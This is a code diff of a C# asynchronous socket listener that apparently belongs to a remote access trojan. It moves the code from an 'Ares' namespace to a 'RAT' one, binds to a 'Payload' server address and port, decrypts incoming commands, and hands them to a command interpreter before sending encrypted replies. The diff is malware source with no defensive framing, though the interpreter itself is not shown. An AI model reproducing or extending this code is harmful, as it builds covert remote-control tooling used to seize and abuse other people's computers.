@@ -19,11 +19,11 @@ public class AsynchronousSocketListener
     {
     }
 
-    public static void  StartListening()
+    public static void StartListening()
     {
         IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());
-        IPAddress ipAddress = Ares.Form1.ipAd;
-        IPEndPoint localEndPoint = new IPEndPoint(ipAddress, Ares.Form1.PortNumber);
+        IPAddress ipAddress = IPAddress.Parse(RAT.Payload.ServerIP);
+        IPEndPoint localEndPoint = new IPEndPoint(ipAddress, RAT.Payload.port);
         Socket listener = new Socket(ipAddress.AddressFamily,
             SocketType.Stream, ProtocolType.Tcp);
         try
@@ -70,11 +70,10 @@ public class AsynchronousSocketListener
             {
                 state.sb.Append(Encoding.ASCII.GetString(
                     state.buffer, 0, bytesRead));
-                content = Ares.UDPHeartBeat.Crypto.Decrypt(state.sb.ToString());
+                content = RAT.UDPListener.Crypto.Decrypt(state.sb.ToString());
                 if (content.IndexOf("<EOF>") > -1)
                 {
-                    Ares.Form1 form = new Ares.Form1();
-                    Ares.TCPInterpreter.main(content);
+                    RAT.TCPInterpreter.main(content);
                     Send(handler, content);
                 }
                 else
@@ -87,13 +86,13 @@ public class AsynchronousSocketListener
         }
         catch
         {
-            
+
         }
     }
 
     private static void Send(Socket handler, String data)
     {
-        byte[] byteData = Encoding.ASCII.GetBytes(Ares.UDPHeartBeat.Crypto.Encrypt(data));
+        byte[] byteData = Encoding.ASCII.GetBytes(RAT.UDPListener.Crypto.Encrypt(data));
         handler.BeginSend(byteData, 0, byteData.Length, 0,
             new AsyncCallback(SendCallback), handler);
     }
